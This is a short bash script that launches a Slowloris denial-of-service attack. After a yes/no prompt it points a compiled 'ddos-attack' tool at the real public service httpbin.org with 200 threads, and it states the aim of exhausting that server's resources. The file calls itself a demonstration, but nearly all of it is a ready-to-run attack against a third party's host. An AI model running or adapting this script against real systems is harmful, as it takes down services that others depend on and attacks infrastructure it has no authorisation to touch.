#!/bin/bash

# Slowloris attack example
# This script demonstrates a Slowloris attack

echo "Slowloris Attack Example"
echo "======================="

# Target configuration
TARGET_URL="https://httpbin.org"
THREADS=200

echo "Target: $TARGET_URL"
echo "Threads: $THREADS"
echo "Attack Type: Slowloris (slow HTTP)"
echo ""

read -p "Continue with Slowloris attack? (y/N): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    echo "Starting Slowloris attack..."
    echo "This will create many slow connections to exhaust server resources."
    
    ./target/release/ddos-attack layer7 \
        --targets "$TARGET_URL" \
        --threads $THREADS \
        --slowloris
else
    echo "Attack cancelled."
fi
